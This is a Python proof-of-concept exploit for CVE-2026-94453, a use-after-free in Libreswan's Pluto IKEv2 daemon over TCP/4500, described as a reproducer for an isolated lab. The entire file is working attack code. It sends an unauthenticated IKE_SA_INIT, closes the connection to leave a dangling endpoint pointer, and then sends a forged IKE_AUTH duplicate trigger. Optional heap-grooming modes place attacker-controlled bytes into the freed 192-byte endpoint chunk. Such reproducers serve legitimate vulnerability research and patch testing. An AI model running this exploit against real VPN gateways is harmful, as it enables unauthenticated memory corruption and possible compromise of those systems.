#!/usr/bin/env python3
"""End-to-end network reproducer for CVE-2026-94453 in an isolated lab.

The default mode performs both TCP connections:

1. send a minimal, valid IKE_SA_INIT request and read the response;
2. close that TCP connection so Pluto processes EOF;
3. reconnect and send the header-only IKE_AUTH duplicate trigger using the
   SPIi from the request and the SPIr extracted from Pluto's response.

With --intermediate-endpoint, the script inserts a third lifetime step:

1. create an intermediate TCP endpoint after connection #1 has reached EOF;
2. pre-open the trigger connection while that intermediate endpoint is live;
3. send the trigger while the intermediate endpoint remains live;
4. check whether the recorded response arrives on the intermediate stream.

This tests same-type heap reuse and possible cross-stream endpoint confusion.
Adding --free-intermediate-before-trigger instead frees the intermediate
endpoint after pre-opening the trigger connection, making an immediate invalid
access easier to observe.

Only Python's standard library is required. The included responder template
offers AES-CBC-256/SHA2-256/MODP2048.
"""

import argparse
import secrets
import socket
import struct
import sys
import time
from typing import Optional, Tuple


IKEV2_VERSION = 0x20
IKE_SA_INIT = 34
IKE_AUTH = 35

NEXT_PAYLOAD_NONE = 0
NEXT_PAYLOAD_SA = 33
NEXT_PAYLOAD_KE = 34
NEXT_PAYLOAD_NONCE = 40
NEXT_PAYLOAD_SK = 46

FLAG_ORIGINAL_INITIATOR = 0x08
FLAG_RESPONSE = 0x20

TRANSFORM_LAST = 0
TRANSFORM_MORE = 3
TRANSFORM_ENCR = 1
TRANSFORM_PRF = 2
TRANSFORM_INTEG = 3
TRANSFORM_KE = 4
ENCR_AES_CBC = 12
PRF_HMAC_SHA2_256 = 5
INTEG_HMAC_SHA2_256_128 = 12
KE_MODP2048 = 14
KEY_LENGTH_ATTRIBUTE_TV = 0x800E

IKE_HEADER_LENGTH = 28

# This is the native size observed for struct iface_endpoint in the tested
# x86-64 Pluto build.  It is not a protocol constant and can differ on another
# architecture, ABI, or source revision.  The deterministic heap-reuse mode
# deliberately makes the cloned packet this size so that malloc places it in
# the same allocator size class as a freed iface_endpoint.
IFACE_ENDPOINT_SIZE_X86_64 = 192

# IKE carried over TCP/4500 uses the ESP-in-TCP framing expected by Linux:
#
#   [2-byte frame length][4-byte zero Non-ESP marker][IKE message]
#
# The literal IKETCP prefix is sent once, before the first framed message, to
# negotiate use of IKE-over-TCP with Pluto.
NON_ESP_MARKER = b"\x00" * 4
IKETCP_PREFIX = b"IKETCP"

# RFC 3526, group 14.  g=2 and the public value occupies exactly 256 bytes.
MODP2048_P = int(
    "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
    "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
    "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
    "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
    "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D"
    "C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F"
    "83655D23DCA3AD961C62F356208552BB9ED529077096966D"
    "670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B"
    "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
    "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
    "15728E5A8AACAA68FFFFFFFFFFFFFFFF",
    16,
)


class ProtocolError(RuntimeError):
    """The peer returned bytes that cannot establish the required test state."""


def unsigned_64(value: str) -> int:
    parsed = int(value, 0)
    if not 0 <= parsed <= 0xFFFFFFFFFFFFFFFF:
        raise argparse.ArgumentTypeError("SPI must fit in 64 bits")
    return parsed


def transform(last: int, transform_type: int, transform_id: int,
              attributes: bytes = b"") -> bytes:
    length = 8 + len(attributes)
    return struct.pack(
        "!BBHBBH", last, 0, length, transform_type, 0, transform_id
    ) + attributes


def build_sa_payload() -> bytes:
    """Build one IKE proposal: AES-CBC-256/SHA2-256/MODP2048."""
    key_length = struct.pack("!HH", KEY_LENGTH_ATTRIBUTE_TV, 256)
    transforms = b"".join(
        (
            transform(TRANSFORM_MORE, TRANSFORM_ENCR, ENCR_AES_CBC, key_length),
            transform(TRANSFORM_MORE, TRANSFORM_PRF, PRF_HMAC_SHA2_256),
            transform(
                TRANSFORM_MORE,
                TRANSFORM_INTEG,
                INTEG_HMAC_SHA2_256_128,
            ),
            transform(TRANSFORM_LAST, TRANSFORM_KE, KE_MODP2048),
        )
    )
    proposal_length = 8 + len(transforms)
    proposal = struct.pack(
        "!BBHBBBB",
        0,  # last proposal
        0,
        proposal_length,
        1,  # proposal number
        1,  # protocol ID: IKE
        0,  # IKE_SA_INIT proposal has no SPI here
        4,  # number of transforms
    ) + transforms
    return struct.pack("!BBH", NEXT_PAYLOAD_KE, 0, 4 + len(proposal)) + proposal


def build_ke_payload() -> bytes:
    private = secrets.randbelow(MODP2048_P - 3) + 2
    public = pow(2, private, MODP2048_P).to_bytes(256, "big")
    body = struct.pack("!HH", KE_MODP2048, 0) + public
    return struct.pack("!BBH", NEXT_PAYLOAD_NONCE, 0, 4 + len(body)) + body


def build_nonce_payload() -> bytes:
    nonce = secrets.token_bytes(32)
    return struct.pack("!BBH", NEXT_PAYLOAD_NONE, 0, 4 + len(nonce)) + nonce


def build_ike_header(spii: int, spir: int, next_payload: int,
                     exchange: int, flags: int, message_id: int,
                     message_length: int) -> bytes:
    header = struct.pack(
        "!QQBBBBII",
        spii,
        spir,
        next_payload,
        IKEV2_VERSION,
        exchange,
        flags,
        message_id,
        message_length,
    )
    assert len(header) == IKE_HEADER_LENGTH
    return header


def build_ike_sa_init(spii: int) -> bytes:
    """Build the valid, unauthenticated exchange that creates the stale state.

    The attacker chooses SPIi.  SPIr is zero in an IKE_SA_INIT request and is
    selected by Pluto in its response.  No PSK or other peer credential is
    needed at this stage of IKEv2.
    """
    payloads = build_sa_payload() + build_ke_payload() + build_nonce_payload()
    header = build_ike_header(
        spii,
        0,
        NEXT_PAYLOAD_SA,
        IKE_SA_INIT,
        FLAG_ORIGINAL_INITIATOR,
        0,
        IKE_HEADER_LENGTH + len(payloads),
    )
    message = header + payloads
    assert len(message) == 376
    return message


def build_trigger(spii: int, spir: int, message_id: int) -> bytes:
    """Build the deliberately incomplete IKE_AUTH duplicate trigger.

    Matching SPIi/SPIr makes Pluto find the half-open IKE SA left by connection
    #1.  IKE_AUTH avoids the special IKE_SA_INIT processing path, while message
    ID 0 matches the request whose response Pluto has already recorded.  Pluto
    therefore takes the duplicate-request retransmission path before it needs
    to authenticate or decrypt a real SK payload.

    The header declares only its own 28 bytes.  pad_trigger_allocation() may
    append bytes to the received allocation without changing that declaration.
    """
    return build_ike_header(
        spii,
        spir,
        NEXT_PAYLOAD_SK,
        IKE_AUTH,
        FLAG_ORIGINAL_INITIATOR,
        message_id,
        IKE_HEADER_LENGTH,
    )


def pad_trigger_allocation(trigger: bytes, actual_length: int) -> bytes:
    """Append ignored bytes while preserving the IKE header's length field.

    process_md() accepts a received packet larger than isa_length and truncates
    md->packet.len only after alloc_md() has cloned the complete packet.  Using
    an actual length equal to sizeof(struct iface_endpoint) can therefore put
    the cloned packet in the endpoint allocation's allocator size class.
    """
    if actual_length < len(trigger):
        raise ValueError(
            f"trigger actual length {actual_length} is below its "
            f"{len(trigger)}-byte IKE header"
        )
    return trigger + b"A" * (actual_length - len(trigger))


def espintcp_frame(ike_message: bytes) -> bytes:
    """Wrap one IKE message in the framing consumed by the ESP-in-TCP ULP."""
    payload = NON_ESP_MARKER + ike_message
    wire_length = 2 + len(payload)
    if wire_length > 0xFFFF:
        raise ValueError("ESPINTCP frame is too large for its 16-bit length")
    # RFC 8229/9329: Length includes the two-byte Length field itself.
    return struct.pack("!H", wire_length) + payload


def connect_iketcp(host: str, port: int, source: Optional[str],
                   timeout: float, prefix_delay: float) -> socket.socket:
    """Open TCP/4500 and complete Pluto's one-time IKETCP prefix phase."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.settimeout(timeout)
        if source is not None:
            sock.bind((source, 0))
        sock.connect((host, port))
        sock.sendall(IKETCP_PREFIX)

        # Pluto consumes the prefix in one EV_READ callback and only then
        # installs the Linux espintcp ULP.  Keep the framed write separate.
        time.sleep(prefix_delay)
        return sock
    except BaseException:
        sock.close()
        raise


def recv_exact(sock: socket.socket, length: int) -> bytes:
    chunks = []
    remaining = length
    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ProtocolError(
                f"TCP EOF while waiting for {remaining} more response bytes"
            )
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def recv_espintcp_frame(sock: socket.socket) -> bytes:
    wire_length = struct.unpack("!H", recv_exact(sock, 2))[0]
    minimum_wire_length = 2 + len(NON_ESP_MARKER) + IKE_HEADER_LENGTH
    if wire_length < minimum_wire_length:
        raise ProtocolError(f"short ESPINTCP response frame: {wire_length} bytes")
    return recv_exact(sock, wire_length - 2)


def parse_ike_sa_init_response(frame_payload: bytes,
                               expected_spii: int) -> Tuple[int, bytes]:
    if frame_payload[:4] != NON_ESP_MARKER:
        raise ProtocolError("response has no four-byte Non-ESP marker")

    ike = frame_payload[4:]
    if len(ike) < IKE_HEADER_LENGTH:
        raise ProtocolError("response has a truncated IKE header")

    spii, spir, next_payload, version, exchange, flags, message_id, length = \
        struct.unpack("!QQBBBBII", ike[:IKE_HEADER_LENGTH])

    if spii != expected_spii:
        raise ProtocolError(
            f"response SPIi 0x{spii:016x} does not match request SPIi "
            f"0x{expected_spii:016x}"
        )
    if spir == 0:
        raise ProtocolError(
            "response SPIr is zero (possibly a COOKIE/error response); "
            "verify that the included responder configuration loaded with "
            "ddos-mode=unlimited"
        )
    if version != IKEV2_VERSION or exchange != IKE_SA_INIT:
        raise ProtocolError(
            f"unexpected response version/exchange: 0x{version:02x}/{exchange}"
        )
    if not flags & FLAG_RESPONSE:
        raise ProtocolError(f"IKE_SA_INIT message is not a response: flags=0x{flags:02x}")
    if message_id != 0:
        raise ProtocolError(f"IKE_SA_INIT response message ID is {message_id}, not 0")
    if length != len(ike):
        raise ProtocolError(
            f"IKE response declares {length} bytes but frame contains {len(ike)}"
        )
    if next_payload != NEXT_PAYLOAD_SA:
        raise ProtocolError(
            f"response starts with payload {next_payload}, not SA; "
            "the proposal was probably rejected"
        )

    return spir, ike


def print_frame(label: str, ike_message: bytes, dump_hex: bool) -> None:
    frame = espintcp_frame(ike_message)
    wire_length = struct.unpack("!H", frame[:2])[0]
    print(
        f"{label}: IKE={len(ike_message)} bytes, "
        f"ESPINTCP Length={wire_length} bytes, wire={len(frame)} bytes"
    )
    if dump_hex:
        print(f"{label} hex: {frame.hex()}")


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Create an IKE_SA_INIT state, close its TCP endpoint, then send "
            "the CVE-2026-94453 second-connection trigger"
        )
    )
    parser.add_argument("host", help="Pluto responder address")
    parser.add_argument("--port", type=int, default=4500)
    parser.add_argument("--source", help="optional local source address")
    parser.add_argument("--spii", type=unsigned_64, default=0x1111111111111111)
    parser.add_argument(
        "--spir",
        type=unsigned_64,
        help="SPIr for --second-only (normally extracted from the first response)",
    )
    parser.add_argument("--message-id", type=int, default=0)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--prefix-delay",
        type=float,
        default=0.20,
        help="seconds between IKETCP and each first framed message",
    )
    parser.add_argument(
        "--eof-delay",
        type=float,
        default=0.50,
        help="seconds after closing connection #1 before opening connection #2",
    )
    parser.add_argument(
        "--hold-open",
        type=float,
        default=0.50,
        help="seconds to keep connection #2 open after the trigger",
    )
    parser.add_argument(
        "--intermediate-endpoint",
        action="store_true",
        help=(
            "insert an intermediate TCP endpoint, pre-open the trigger "
            "connection, and keep the intermediate endpoint live while sending"
        ),
    )
    parser.add_argument(
        "--free-intermediate-before-trigger",
        action="store_true",
        help=(
            "with --intermediate-endpoint, close the intermediate endpoint "
            "before sending the trigger instead of testing cross-stream reuse"
        ),
    )
    parser.add_argument(
        "--intermediate-source",
        help=(
            "optional source address for the intermediate connection "
            "(default: the value of --source)"
        ),
    )
    parser.add_argument(
        "--intermediate-eof-delay",
        type=float,
        default=0.50,
        help=(
            "seconds to wait after closing the intermediate connection "
            "before sending the trigger (default: 0.50)"
        ),
    )
    parser.add_argument(
        "--reuse-stale-chunk-with-trigger",
        action="store_true",
        help=(
            "append ignored bytes so the received trigger allocation is "
            "192 bytes, matching sizeof(struct iface_endpoint) on the "
            "tested x86-64 build; requires --free-intermediate-before-trigger"
        ),
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument(
        "--first-only",
        action="store_true",
        help="send IKE_SA_INIT, read its response, close, and stop",
    )
    mode.add_argument(
        "--second-only",
        action="store_true",
        help="skip IKE_SA_INIT and send only the trigger (requires --spir)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="build and print frames without opening a connection",
    )
    parser.add_argument(
        "--dump-hex",
        action="store_true",
        help="print complete frame bytes",
    )
    args = parser.parse_args()

    if not 0 <= args.message_id <= 0xFFFFFFFF:
        parser.error("--message-id must fit in 32 bits")
    if args.spii == 0:
        parser.error("--spii must be non-zero")
    if args.second_only and args.spir == 0:
        parser.error("--spir must be non-zero")
    if args.port <= 0 or args.port > 65535:
        parser.error("--port must be between 1 and 65535")
    if (
        args.timeout <= 0
        or args.prefix_delay < 0
        or args.eof_delay < 0
        or args.intermediate_eof_delay < 0
        or args.hold_open < 0
    ):
        parser.error("timeouts/delays must be non-negative, and --timeout positive")
    if args.second_only and args.spir is None:
        parser.error("--second-only requires --spir")
    if args.free_intermediate_before_trigger and not args.intermediate_endpoint:
        parser.error(
            "--free-intermediate-before-trigger requires --intermediate-endpoint"
        )
    if (
        args.reuse_stale_chunk_with_trigger
        and not args.free_intermediate_before_trigger
    ):
        parser.error(
            "--reuse-stale-chunk-with-trigger requires "
            "--intermediate-endpoint and --free-intermediate-before-trigger"
        )
    if (
        args.intermediate_endpoint
        and args.free_intermediate_before_trigger
        and args.prefix_delay + args.intermediate_eof_delay >= 4.5
    ):
        parser.error(
            "the pre-opened trigger connection must receive its first frame "
            "before Pluto's 5-second IKETCP prefix timeout"
        )

    print(f"SPIi: 0x{args.spii:016x}")

    first_request = None
    if not args.second_only:
        first_request = build_ike_sa_init(args.spii)
        print_frame("connection #1 IKE_SA_INIT request", first_request, args.dump_hex)

    if args.dry_run:
        if not args.first_only:
            dry_spir = args.spir if args.spir is not None else 0x2222222222222222
            if args.spir is None:
                print(
                    "dry-run: using placeholder SPIr 0x2222222222222222; "
                    "a live run extracts the real value"
                )
            trigger = build_trigger(args.spii, dry_spir, args.message_id)
            if args.reuse_stale_chunk_with_trigger:
                trigger = pad_trigger_allocation(
                    trigger, IFACE_ENDPOINT_SIZE_X86_64
                )
            trigger_number = 3 if args.intermediate_endpoint else 2
            if args.intermediate_endpoint:
                print(
                    "connection #2: intermediate endpoint (prefix only, "
                    + (
                        "closed before trigger)"
                        if args.free_intermediate_before_trigger
                        else "kept live during trigger)"
                    )
                )
            print_frame(
                f"connection #{trigger_number} IKE_AUTH trigger", trigger, True
            )
        return 0

    spir = args.spir
    if first_request is not None:
        # Connection #1 creates S1 and endpoint E1.  Processing IKE_SA_INIT
        # stores an owned E1 reference in S1.st_iface_endpoint and records the
        # response that the forged duplicate request will later retransmit.
        print("connection #1: connecting and sending IKE_SA_INIT")
        first_sock = connect_iketcp(
            args.host, args.port, args.source, args.timeout, args.prefix_delay
        )
        try:
            first_sock.sendall(espintcp_frame(first_request))
            response_frame = recv_espintcp_frame(first_sock)
            spir, response_ike = parse_ike_sa_init_response(
                response_frame, args.spii
            )
            print(
                f"connection #1: valid IKE_SA_INIT response "
                f"({len(response_ike)} IKE bytes), SPIr=0x{spir:016x}"
            )
        finally:
            # Closing connection #1 makes Pluto process TCP EOF.  In the
            # vulnerable implementation iketcp_shutdown() releases/frees E1,
            # but S1.st_iface_endpoint retains E1's old address (called A in
            # the report), so the surviving IKE state now contains a dangling
            # pointer.
            try:
                first_sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            first_sock.close()

        print(
            f"connection #1: closed; waiting {args.eof_delay:.2f}s "
            "for Pluto to process EOF"
        )
        time.sleep(args.eof_delay)

    if args.first_only:
        return 0

    assert spir is not None

    # This packet uses the attacker-selected SPIi and the clear-text SPIr from
    # Pluto's IKE_SA_INIT response.  It does not contain valid authentication
    # material; the vulnerable retransmission decision precedes that check.
    trigger = build_trigger(args.spii, spir, args.message_id)
    if args.reuse_stale_chunk_with_trigger:
        trigger = pad_trigger_allocation(trigger, IFACE_ENDPOINT_SIZE_X86_64)
        print(
            "heap-reuse mode: trigger allocation is "
            f"{len(trigger)} bytes while IKE header still declares "
            f"{IKE_HEADER_LENGTH} bytes"
        )
    trigger_number = 3 if args.intermediate_endpoint else 2
    print(f"SPIr used by trigger: 0x{spir:016x}")
    print_frame(
        f"connection #{trigger_number} IKE_AUTH trigger",
        trigger,
        args.dump_hex,
    )

    intermediate_sock = None
    trigger_sock = None
    try:
        if args.intermediate_endpoint:
            intermediate_source = (
                args.intermediate_source
                if args.intermediate_source is not None
                else args.source
            )
            print(
                "connection #2: creating intermediate endpoint "
                f"from {intermediate_source or 'the default source address'}"
            )

            # Heap grooming step 1: after E1@A was freed, accepting connection
            # #2 normally allocates another same-sized endpoint E2 at A.  This
            # temporarily consumes A so that the next endpoint cannot take it.
            intermediate_sock = connect_iketcp(
                args.host,
                args.port,
                intermediate_source,
                args.timeout,
                args.prefix_delay,
            )

            print(
                "connection #3: pre-opening trigger endpoint while "
                "connection #2 is still live"
            )

            # Heap grooming step 2: E2 still occupies A, so connection #3's
            # endpoint E3 must use another compatible chunk (called B).  E3
            # remains the real transport on which the trigger is received.
            trigger_sock = connect_iketcp(
                args.host,
                args.port,
                args.source,
                args.timeout,
                args.prefix_delay,
            )

            if args.free_intermediate_before_trigger:
                print(
                    "connection #2: closing intermediate endpoint; waiting "
                    f"{args.intermediate_eof_delay:.2f}s for Pluto to process EOF"
                )
                try:
                    intermediate_sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                intermediate_sock.close()
                intermediate_sock = None

                # Once Pluto processes EOF for connection #2, E2 is freed and
                # A becomes available again.  No new endpoint is opened after
                # this point: the next relevant same-sized allocation should
                # instead be the clone of connection #3's 192-byte packet.
                time.sleep(args.intermediate_eof_delay)
        else:
            print("connection #2: connecting and sending trigger")
            trigger_sock = connect_iketcp(
                args.host,
                args.port,
                args.source,
                args.timeout,
                args.prefix_delay,
            )

        print(f"connection #{trigger_number}: sending trigger")

        # In --reuse-stale-chunk-with-trigger mode the actual IKE buffer is
        # 192 bytes although isa_length remains 28.  alloc_md() first clones
        # all 192 received bytes; allocator grooming makes that clone reuse A.
        # process_md() later reduces only md->packet.len to 28 without moving
        # or shrinking the allocation.  Consequently:
        #
        #   S1.st_iface_endpoint == A == md->packet.ptr
        #
        # The duplicate-response path passes A to send_shunks(), which treats
        # attacker-controlled packet bytes as struct iface_endpoint fields.
        trigger_sock.sendall(espintcp_frame(trigger))
        time.sleep(args.hold_open)

        if intermediate_sock is not None:
            try:
                data = intermediate_sock.recv(4096)
                print(
                    "connection #2: recv after connection #3 trigger returned "
                    f"{len(data)} bytes: {data.hex()}"
                )
            except (ConnectionResetError, BrokenPipeError) as exc:
                print(f"connection #2 failed after connection #3 trigger: {exc}")
            except socket.timeout:
                print(
                    "connection #2: no cross-stream response; inspect Pluto "
                    "log and endpoint addresses"
                )

            # Avoid spending the full socket timeout checking a stream that is
            # expected to receive no response in the heap-reuse case.
            trigger_sock.settimeout(min(args.timeout, 1.0))

        try:
            data = trigger_sock.recv(4096)
            print(
                f"connection #{trigger_number}: recv returned "
                f"{len(data)} bytes: {data.hex()}"
            )
        except (ConnectionResetError, BrokenPipeError) as exc:
            print(f"connection #{trigger_number} failed after trigger: {exc}")
        except socket.timeout:
            print(
                f"connection #{trigger_number}: no response; "
                "inspect Pluto log/ASan output"
            )
    finally:
        if intermediate_sock is not None:
            intermediate_sock.close()
        if trigger_sock is not None:
            trigger_sock.close()

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, ProtocolError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
